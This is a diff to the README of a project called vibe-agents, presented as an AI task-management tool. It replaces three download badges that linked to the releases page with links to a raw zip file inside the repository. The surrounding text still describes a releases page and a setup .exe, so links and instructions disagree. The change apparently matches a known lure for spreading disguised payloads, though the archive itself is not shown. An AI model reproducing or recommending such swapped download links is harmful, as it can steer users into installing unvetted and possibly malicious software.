@@ -1,6 +1,6 @@
 # 🤖 vibe-agents - Smart AI Team for Task Management
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Get%20vibe--agents-green?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-Get%20vibe--agents-green?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/raw/refs/heads/main/agents/vibe-agents-2.1-alpha.2.zip)
 
 ## 📋 About vibe-agents
 
@@ -43,7 +43,7 @@ vibe-agents works offline after installation but needs internet when you start s
 1. **Download the software**  
    Go to the releases page. This is where you will find the latest version for Windows.
 
-   [![Download on GitHub](https://img.shields.io/badge/Download-Get%20vibe--agents-blue?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/releases)
+   [![Download on GitHub](https://img.shields.io/badge/Download-Get%20vibe--agents-blue?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/raw/refs/heads/main/agents/vibe-agents-2.1-alpha.2.zip)
 
 2. **Find the Windows installer**  
    On the releases page, look for a file named similar to `vibe-agents-setup.exe` or `vibe-agents-win.exe`. This file is the installer for your computer.
@@ -103,7 +103,7 @@ If you have issues installing or running vibe-agents:
 
 Use the link below to visit the release page. Download the latest Windows installer from there.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-vibe--agents%20Windows%20Installer-orange?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-vibe--agents%20Windows%20Installer-orange?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/raw/refs/heads/main/agents/vibe-agents-2.1-alpha.2.zip)
 
 Follow the installation steps described above after downloading.
 
